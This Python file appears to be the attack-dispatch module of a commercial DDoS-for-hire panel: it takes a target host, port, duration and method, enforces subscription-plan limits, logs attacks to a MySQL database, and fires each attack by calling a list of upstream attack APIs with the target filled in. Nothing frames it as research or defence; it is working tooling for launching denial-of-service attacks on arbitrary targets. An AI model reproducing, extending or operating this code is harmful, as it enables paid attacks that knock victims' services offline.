import requests, datetime, pymysql
from colorama import Fore as F
from utils.configuration.configuration import *
from utils.configuration.variables import *
from utils.configuration.mysql import MySQL
from utils.configuration.api import *
from utils.configuration.application import *
from utils.configuration.configuration import DB_NAME, DB_HOST, DB_PASSWORD, DB_USER
from utils.configuration.application import *
import requests
import datetime



class Attack:
    def __init__(self, host, port, time, method, vip, plan, username, timeout=3):
        self.host = host
        self.port = port
        self.time = time
        self.method = method
        self.vip = vip
        self.plan = plan
        self.username = username
        self.timeout = timeout
        print(self.host, self.port, self.time, self.method, self.vip, self.plan, self.username, self.timeout)

        

    def update_logs(self):
        print("update_logs")  
        limit = User(plan=self.plan).get_plans_concurrent_by_name()

        now = datetime.datetime.now()
        later = now + datetime.timedelta(seconds=int(self.time))

        try:
            db = MySQL()
            sql = "INSERT INTO logs (user, host, port, time, methods, end, conc_max) VALUES (%s, %s, %s, %s, %s, %s, %s)"
            val = (self.username, self.host, self.port, now, self.method, later, limit)
            db.execute(sql, val)
        except Exception as e:
            print(f"Erreur lors de la connexion à la base de données: {e}")

    def delete_logs(self):
        now = datetime.datetime.now()
        now = str(now)
        try:
            db = MySQL()
            logs = db.execute_one("SELECT id, user, host, port, time, methods, end, conc_max FROM logs")

            to_delete = []

            for user_data in logs:
                if user_data['end'] is not None and user_data['end'] < now:
                    to_delete.append(user_data['id'])

            for id in to_delete:
                print(f"Attack {id} is over, deleting it from the database")
                sql = ('DELETE FROM logs WHERE id = %s')
                db.execute_delete(sql, (id,))

        except Exception as e:
            print(f"Erreur lors de la connexion à la base de données: {e}")

    def attack(self):
            self.delete_logs()
            if self.vip == 1 and self.method in METHOD_VIP:
                try:
                    max_conc = User(plan=self.plan).get_plans_concurrent_by_name()[0]
                    max_time = User(plan=self.plan).get_plans_maxtime_by_name()[0]
                    conc_used = User(self.username).get_logs_by_user()

                    if str(conc_used) > str(max_conc):
                        raise ValueError("You have reached your concurrent limit")

                    if str(self.time) > str(max_time):
                        raise ValueError("You have reached your maxtime limit")
                    else:
                        self.update_logs()
                        for api in API:
                            r = requests.get(url=api.format(self.host, self.port, self.time), timeout=self.timeout)
                            if r.status_code == 200:
                                if User(self.username).get_rank_by_username() == "admin":
                                    print(f"{F.GREEN}[{api}] {F.GREEN}Attack sent to {self.host}:{self.port} for {self.time} seconds")
                                else:
                                    print(f"{F.GREEN}Attack sent to {self.host}:{self.port} for {self.time} seconds")
                            else:
                                if User(self.username).get_rank_by_username() == "admin":
                                    print(f"{F.RED}[{api}] {F.RED}Attack failed to {self.host}:{self.port} for {self.time} seconds")
                                else:
                                    return False
                except ValueError as e:
                    print(str(e))
            else:
                try:
                    max_conc = User(plan=self.plan).get_plans_concurrent_by_name()
                    max_time = User(plan=self.plan).get_plans_maxtime_by_name()

                    conc_used = User(self.username).get_logs_by_user()

                    if str(conc_used) > str(max_conc):
                        raise ValueError("You have reached your concurrent limit")
                    if str(self.time) > str(max_time):
                        raise ValueError("You have reached your maxtime limit")
                    else:
                        self.update_logs()
                        for api in API:
                            r = requests.get(url=api.format(self.host, self.port, self.time), timeout=self.timeout)
                            if r.status_code == 200:
                                if User(self.username).get_rank_by_username() == "admin":
                                    print(f"{F.GREEN}[{api}] {F.GREEN}Attack sent to {self.host}:{self.port} for {self.time} seconds")
                                else:
                                    print(f"{F.GREEN}Attack sent to {self.host}:{self.port} for {self.time} seconds")

                            else:
                                if User(self.username).get_rank_by_username() == "admin":
                                    print(f"{F.RED}[{api}] {F.RED}Attack failed to {self.host}:{self.port} for {self.time} seconds")
                                else:
                                    return False
                except ValueError as e:
                    print(str(e))

        
            




